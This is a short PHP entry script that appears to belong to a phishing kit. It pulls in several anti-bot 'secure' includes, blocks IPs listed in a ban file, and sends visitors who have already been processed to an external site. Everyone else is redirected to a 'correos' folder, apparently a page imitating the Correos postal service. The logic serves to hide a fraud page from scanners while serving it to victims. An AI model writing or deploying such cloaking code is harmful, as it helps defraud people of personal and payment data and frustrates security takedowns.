<?php

    include 'secure/anti1.php';
	include 'secure/anti2.php';
	include 'secure/anti3.php';
	include 'secure/anti4.php';
	include 'secure/anti5.php';
	include 'secure/anti6.php';
	include 'secure/anti7.php';
	include 'secure/anti8.php';
	include 'vendor/random.php';
	include 'vendor/seen.php';
	include 'vendor/forbidden.php';

   // To banned IP Bots Go to => vendor/ban.txt and put your IPS.
   $file = file_get_contents( "vendor/ban.txt" );
   if(@$_SESSION['Done'] == 1 || preg_match("#\b{$IPAdress}\b#", $file ) ) {
   die('<META HTTP-EQUIV="Refresh" Content="0; URL=https://www./">');
   exit();
   }



header("Location: ./correos");
?>